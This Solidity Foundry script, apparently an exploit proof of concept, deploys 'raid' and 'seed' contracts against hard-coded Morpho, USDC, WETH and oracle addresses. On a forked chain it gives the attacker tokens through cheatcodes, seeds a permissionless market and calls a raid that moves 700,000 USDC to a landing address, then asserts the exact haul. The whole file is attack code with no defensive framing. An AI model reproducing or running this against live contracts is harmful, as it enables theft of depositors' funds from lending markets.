// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Script, console2} from "forge-std/Script.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {CrownWethIdleRaid} from "../src/CrownWethIdleRaid.sol";
import {CrownPermissionlessWethSeed} from "../src/CrownPermissionlessWethSeed.sol";

interface IERC20P {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}
interface IMorphoAuth {
    function setAuthorization(address, bool) external;
}

contract ProveRaid is Script, StdCheats {
    address constant LANDING = 0x5Adcea5319eA9Eac1241B95Ca53690574cFa2357;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant RSS = 0x7a305D07B537359cf468eAea9bb176E5308bC337;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant ORACLE_RSS = 0xB5840644142B341a6145335e2ebc82EEBC7aE1B9;
    address constant ORACLE_WETH = 0xFEa2D58cEfCb9fcb597723c6bAE66fFE4193aFE4;
    bytes32 constant MID = 0x8793cf302b8ffd655ab97bd1c695dbd967807e8367a65cb2f4edaf1380ba1bda;
    uint256 constant WANT = 700_000e6;
    uint256 constant EQ = 360 ether;

    function run() external {
        address king = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        address filler = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        uint256 land0 = IERC20P(USDC).balanceOf(LANDING);

        vm.startBroadcast(king);
        CrownWethIdleRaid raid = new CrownWethIdleRaid(MORPHO, USDC, WETH, king, LANDING, MID);
        IMorphoAuth(MORPHO).setAuthorization(address(raid), true);
        CrownPermissionlessWethSeed seed =
            new CrownPermissionlessWethSeed(RSS, WETH, ORACLE_RSS, ORACLE_WETH, king, king, 2000);
        vm.stopBroadcast();

        // deal inventories
        deal(RSS, king, 2_000_000 ether);
        deal(WETH, filler, EQ);

        vm.startBroadcast(king);
        IERC20P(RSS).approve(address(seed), type(uint256).max);
        seed.depositRss(seed.quoteRssOut(EQ));
        vm.stopBroadcast();

        vm.startBroadcast(filler);
        IERC20P(WETH).approve(address(seed), EQ);
        seed.fill(EQ);
        vm.stopBroadcast();

        console2.log("king WETH after fill", IERC20P(WETH).balanceOf(king));

        vm.startBroadcast(king);
        IERC20P(WETH).approve(address(raid), EQ);
        raid.raid(EQ, WANT);
        vm.stopBroadcast();

        uint256 delta = IERC20P(USDC).balanceOf(LANDING) - land0;
        console2.log("Landing delta", delta);
        require(delta == WANT, "MISS");
    }
}
